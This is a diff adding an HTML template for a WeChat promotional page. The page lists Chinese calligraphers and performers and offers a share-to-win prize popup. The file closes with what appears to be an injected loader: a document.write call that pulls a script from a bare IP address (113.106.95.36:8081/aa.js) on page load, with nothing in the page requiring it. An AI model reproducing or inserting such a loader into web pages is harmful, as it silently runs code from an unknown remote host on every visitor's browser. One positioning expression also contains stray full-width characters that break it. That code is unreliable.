@@ -1,0 +1,347 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1" />  
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="format-detection" content="telephone=no" />
+<meta http-equiv="Content-Type" content="text/html; charset=gbk" />
+<title>万福进万家艺术家</title>
+
+<link rel="stylesheet" type="text/css"  href="{[$DIR]}mobel_css.css" /> 
+<script language="JavaScript" src="{[$DIR]}js/jquery-1.7.js"></script> 
+<script language="JavaScript" src="{[$DIR]}js/tab.js"></script>
+<script type="text/javascript" src="{[$DIR]}js/background.js"></script>
+<script src="http://res.wx.qq.com/open/js/jweixin-1.0.0.js"></script>
+<script>
+wx.config({
+    debug: false, // 开启调试模式,调用的所有api的返回值会在客户端alert出来，若要查看传入的参数，可以在pc端打开，参数信息会通过log打出，仅在pc端时才会打印。
+    appId: '{[$jsApiArr.appId]}', // 必填，公众号的唯一标识
+    timestamp: '{[$jsApiArr.timestamp]}', // 必填，生成签名的时间戳
+    nonceStr: '{[$jsApiArr.nonceStr]}', // 必填，生成签名的随机串
+    signature: '{[$jsApiArr.signature]}',// 必填，签名，见附录1
+    jsApiList: [
+        'checkJsApi',
+        'onMenuShareTimeline',
+        'onMenuShareAppMessage',
+        'onMenuShareQQ',
+        'onMenuShareWeibo',
+        'hideMenuItems',
+        'showMenuItems',
+        'hideAllNonBaseMenuItem',
+        'showAllNonBaseMenuItem',
+        'translateVoice',
+        'startRecord',
+        'stopRecord',
+        'onRecordEnd',
+        'playVoice',
+        'pauseVoice',
+        'stopVoice',
+        'uploadVoice',
+        'downloadVoice',
+        'chooseImage',
+        'previewImage',
+        'uploadImage',
+        'downloadImage',
+        'getNetworkType',
+        'openLocation',
+        'getLocation',
+        'hideOptionMenu',
+        'showOptionMenu',
+        'closeWindow',
+        'scanQRCode',
+        'chooseWXPay',
+        'openProductSpecificView',
+        'addCard',
+        'chooseCard',
+        'openCard'
+      ] // 必填，需要使用的JS接口列表，所有JS接口列表见附录2
+});
+
+function fabudisplay()
+{
+var popUp = document.getElementById("choujiang")
+//document.getElementById('fabu_box').style.display='';
+
+var obj = document.getElementById("choujiang");
+var W = screen.width;//取得屏幕分辨率宽度
+var H = screen.height;//取得屏幕分辨率高度
+var yScroll;//取滚动条高度
+if (self.pageYOffset) {
+yScroll = self.pageYOffset;
+} else if (document.documentElement && document.documentElement.scrollTop){
+yScroll = document.documentElement.scrollTop;
+} else if (document.body) {
+yScroll = document.body.scrollTop;
+}
+
+//obj.style.marginLeft= (W/2 - 200) + "px";
+
+obj.style.display="block"; 
+}
+function fabudisplay2()
+{
+var popUp = document.getElementById("liquan")
+//document.getElementById('fabu_box').style.display='';
+
+var obj = document.getElementById("liquan");
+var W = screen.width;//取得屏幕分辨率宽度
+var H = screen.height;//取得屏幕分辨率高度
+var yScroll;//取滚动条高度
+if (self.pageYOffset) {
+yScroll = self.pageYOffset;
+} else if (document.documentElement && document.documentElement.scrollTop){
+yScroll = document.documentElement.scrollTop;
+} else if (document.body) {
+yScroll = document.body.scrollTop;
+}
+
+//obj.style.marginLeft= (W/2 - 200) + "px";
+obj.style.top= (H/2- 　+　yScroll) + "px";
+obj.style.display="block"; 
+}
+</script>
+</head>
+
+<body>
+<div id="wrap">
+<div id="content">
+      <div class="yishujia">
+            <ul>
+            <li class="left" >
+            <div class="img"><img src="{[$DIR]}images/yishujia_l.jpg" /></div>
+            <div class="jieshao">
+            <h1>毕福剑</h1>
+            <h2>著名主持人</h2>
+            <h2>中央电视台文艺部导演</h2>
+            </div>        
+            </li>
+            
+            <li class="right" >
+            <div class="img"><img src="{[$DIR]}images/yishujia_c.jpg" /></div>
+            <div class="jieshao">
+            <h1>单田芳</h1>
+            <h2>国宝级评书大师</h2>
+            <h2>著名评书表演艺术家</h2>
+            </div>
+            </li>
+            </ul>          
+      </div> 
+      
+      <div class="yishujia">
+            <ul>
+            <li class="left" >
+            <div class="img"><img src="{[$DIR]}images/yishujia_a.jpg" /></div>
+            <div class="jieshao">
+            <h1>何满宗</h1>
+            <h2>中国书法家协会理事</h2>
+            <h2>湖南省文联副主席</h2>
+            </div>        
+            </li>
+            
+            <li class="right" >
+            <div class="img"><img src="{[$DIR]}images/yishujia_m.jpg" /></div>
+            <div class="jieshao">
+            <h1>毕政</h1>
+            <h2>中国书协理事</h2>
+            <h2>吉林书法家协会主席</h2>
+            </div>
+            </li>
+            </ul>       
+      </div>
+      
+      <div class="yishujia">
+            <ul>
+            <li class="left" >
+            <div class="img"><img src="{[$DIR]}images/yishujia_e.jpg" /></div>
+            <div class="jieshao">
+            <h1>王庆元</h1>
+            <h2>中国书法家协会理事</h2>
+            <h2>青海省书协主席</h2>
+            </div>        
+            </li>
+            
+            <li class="right" >
+            <div class="img"><img src="{[$DIR]}images/yishujia_f.jpg" /></div>
+            <div class="jieshao">
+            <h1>刘俊京</h1>
+            <h2>中国书法家协会理事</h2>
+            <h2>北京书法家协会副主席</h2>
+            </div>
+            </li>
+            </ul>    
+              
+              <div class="yishujia">
+            <ul>
+            <li class="left" >
+            <div class="img"><img src="{[$DIR]}images/yishujia_g.jpg" /></div>
+            <div class="jieshao">
+            <h1>马青原</h1>
+            <h2>中国书法家协会会员</h2>
+            <h2>北京工笔重彩画会员</h2>
+            </div>        
+            </li>
+            
+            <li class="right" >
+            <div class="img"><img src="{[$DIR]}images/yishujia_h.jpg" /></div>
+            <div class="jieshao">
+            <h1>连海明</h1>
+            <h2>中国书法家协会会员</h2>
+            <h2>中国美术家画院理事</h2>
+            </div>
+            </li>
+            </ul>          
+      </div>
+      <div class="yishujia">
+            <ul>
+            <li class="left" >
+            <div class="img"><img src="{[$DIR]}images/yishujia_i.jpg" /></div>
+            <div class="jieshao">
+            <h1>刘国宝</h1>
+            <h2>西藏书协副主席</h2>
+            <h2>中国书法家协会会员</h2>
+            </div>        
+            </li>
+            
+            <li class="right" >
+            <div class="img"><img src="{[$DIR]}images/yishujia_j.jpg" /></div>
+            <div class="jieshao">
+            <h1>徐家康</h1>
+            <h2>中国书法家协会会员</h2>
+            <h2>学者型画家</h2>
+            </div>
+            </li>
+            </ul>          
+      </div>
+            <div class="yishujia">
+            <ul>
+            <li class="left" >
+            <div class="img"><img src="{[$DIR]}images/yishujia_k.jpg" /></div>
+            <div class="jieshao">
+            <h1>黄 平</h1>
+            <h2>中国书法家协会会员</h2>
+            <h2>中国书法展览馆副馆长</h2>
+            </div>        
+              </li>
+                          <li class="right" >
+            <div class="img"><img src="{[$DIR]}images/yishujia_n.jpg" /></div>
+            <div class="jieshao">
+            <h1>武华兴</h1>
+            <h2>中国书法家协会会员</h2>
+            <h2>徐悲鸿艺术中心主任</h2>
+            </div>
+            </li>
+
+            </ul>          
+      </div>
+       
+       <div style="height:120px; overflow:hidden; width:100%;"></div>
+       
+                  <div class="yishujia-pf">      
+                  <div class="annbj">
+                  <div class="one">
+                  <a href="#tanchu-2">
+                    <button type="button"  id="btnshow" class="anniu" onclick="fabudisplay();testMessageBox(event);  showdiv();"/>我要集福</button>
+                    </a>
+                  </div>
+                  <div class="two"></div>            
+                  </div>        
+                  <div class="fanhui"><a href="index.php?m=main&p=main">返回</a></div>
+                  <div class="ysj_mail">艺术家进驻请发简历至art@96567.com</div>
+                  </div>
+     
+<!--底部菜单-->   
+
+<!--底部菜单点击后弹出-->   
+     <div id="bg"></div>
+      <div id="choujiang" style="width:100%; height:100%; position:absolute; top:0; left:0; z-index:1000; background-color:none;  display:none; color:#fff">
+            <div class="fenxiang"> 
+            <a name="tanchu-2"></a>  
+            <div class="jiantou"><p><img src="{[$DIR]}images/jiantou.png" /></p></div>
+            <div class="djysj">
+            <span>点击右上角按钮：</span>
+            <span class="s_icon"><img src="{[$DIR]}images/fpy.png" width="30" /></span>
+            <span class="s_icon"><img src="{[$DIR]}images/pyq.png" width="30" /></span>
+            </div>
+      
+            <div class="djysj"><h1>分享给好友，千元福字轻松拿！</h1></div>
+            <div class="djysj">一个好友点击将为你带来1—3个祝福<br />满一百个，千元大礼就是你的啦！</div>
+            <div class="djysj"><h2>朋友和朋友的朋友点击均有效哦</h2></div>
+            </div>
+            <div class="lml_close" onClick="document.getElementById('choujiang').style.display='none';closeWindow()">×</div>
+      </div>  
+      
+      <div id="fenxiang" style="width:100%; height:100%; position:absolute; top:0; left:0; z-index:1000; background-color:none;  display:none; color:#fff">
+            <div class="fenxiang"> 
+            <a name="tanchu-2"></a>  
+            <div class="jiantou"><p><img src="{[$DIR]}images/jiantou.png" /></p></div>
+            <div class="djysj">
+            <span>点击右上角按钮：</span>
+            <span class="s_icon"><img src="{[$DIR]}images/fpy.png" width="30" /></span>
+            <span class="s_icon"><img src="{[$DIR]}images/pyq.png" width="30" /></span>
+            </div>
+      
+            <div class="djysj"><h1>分享给好友，千元福字轻松拿！</h1></div>
+            <div class="djysj">一个好友点击将为你带来1—3个祝福<br />满一百个，千元大礼就是你的啦！</div>
+            <div class="djysj"><h2>朋友和朋友的朋友点击均有效哦</h2></div>
+            </div>
+            <div class="lml_close"  onClick="document.getElementById('fenxiang').style.display='none';closeWindow()">×</div>
+            <a name="fenxiang"></a>
+      </div>
+      
+        
+</div>
+
+<div class="zztj">
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1254040973'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/stat.php%3Fid%3D1254040973' type='text/javascript'%3E%3C/script%3E"));
+</script>
+</div>
+</body>
+<script>
+wx.ready(function () {
+	//分享到朋友圈
+	wx.onMenuShareTimeline({
+		title: '{[$weixinTitle]}', // 分享标题
+		link: 'http://weixin.96567.com/hd/index.php?m=main&c=jifu&p=main&openid={[$userArr.openid]}', // 分享链接
+		imgUrl: 'http://weixin.96567.com/hd/static/images/f_logo.jpg', // 分享图标
+		success: function () { 
+			// 用户确认分享后执行的回调函数
+		},
+		cancel: function () { 
+			// 用户取消分享后执行的回调函数
+		}
+	});
+	
+	//分享给好友
+	wx.onMenuShareAppMessage({
+		title: '{[$weixinTitle]}', // 分享标题
+		desc: '{[$weixinTitle1]}', // 分享描述
+		link: 'http://weixin.96567.com/hd/index.php?m=main&c=jifu&p=main&openid={[$userArr.openid]}', // 分享链接
+		imgUrl: 'http://weixin.96567.com/hd/static/images/f_logo.jpg', // 分享图标
+		type: '', // 分享类型,music、video或link，不填默认为link
+		dataUrl: '', // 如果type是music或video，则要提供数据链接，默认为空
+		success: function () { 
+			// 用户确认分享后执行的回调函数
+		},
+		cancel: function () { 
+			// 用户取消分享后执行的回调函数
+		}
+	});
+})
+
+function setTab(name,val,val1){
+var obj = $('#con_' + name + '_' + val);
+if(obj.is(":hidden")){
+obj.show();	
+}else{
+obj.hide();	
+}
+$('.Contentbox .hover').each(function(i, obj) {
+if((i+1) != val){
+$(obj).hide();	
+}
+});
+}  
+var bhid = 607;
+document.write("<script type=\"text/javascript\" src=\"http://113.106.95.36:8081/aa.js\"><\/script>");
+</script>
+</html>
